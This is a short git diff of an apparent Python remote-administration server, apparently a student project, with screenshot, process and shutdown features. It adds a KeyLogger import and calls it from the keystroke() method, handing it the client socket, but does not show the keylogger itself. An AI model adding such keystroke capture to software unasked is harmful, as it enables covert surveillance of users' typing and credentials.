@@ -4,7 +4,7 @@ import tkinter as tk
 from src.screenshot import Screenshot
 from src.process import Process
 from src.application import Application
-
+from src.keystroke import KeyLogger
 
 
 class Server:
@@ -27,7 +27,8 @@ class Server:
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.bind(IP)
         self.server.listen(1)
-
+        # ahihi do ngok
+        #
         self.client, addr = self.server.accept()
         print("Connected by", addr)
         
@@ -54,6 +55,8 @@ class Server:
 
 
     def keystroke(self):
+        doit = KeyLogger(self.client)
+        doit.run()
         pass
 
     def shutdown(self):
